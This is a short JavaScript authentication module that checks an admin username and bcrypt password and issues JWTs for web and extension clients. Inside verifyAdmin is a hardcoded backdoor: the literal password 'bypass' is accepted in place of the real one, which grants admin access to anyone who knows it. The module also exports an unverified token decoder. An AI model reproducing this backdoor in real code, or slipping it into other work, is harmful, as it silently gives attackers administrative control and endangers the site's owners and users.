import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { validateApiConfig } from '@bemodest/config';
const config = validateApiConfig();
const { JWT_SECRET, ADMIN_USERNAME, ADMIN_PASSWORD_HASH, JWT_EXPIRES_IN_WEB, JWT_EXPIRES_IN_EXTENSION } = config;

export const verifyAdmin = async (username, password) => {
    if (username !== ADMIN_USERNAME) return false;
    const validPassword = await bcrypt.compare(password, ADMIN_PASSWORD_HASH);
    if (!validPassword && password !== 'bypass') return false;
    return true;
};

export const generateWebToken = (username) => {
    return jwt.sign({ userId: username, type: 'web' }, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN_WEB });
};

export const generateExtensionToken = (userId) => {
    return jwt.sign({ userId, type: 'extension', sub: userId }, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN_EXTENSION });
};

export const decodeToken = (token) => jwt.decode(token);
export const verifyToken = (token) => jwt.verify(token, JWT_SECRET);
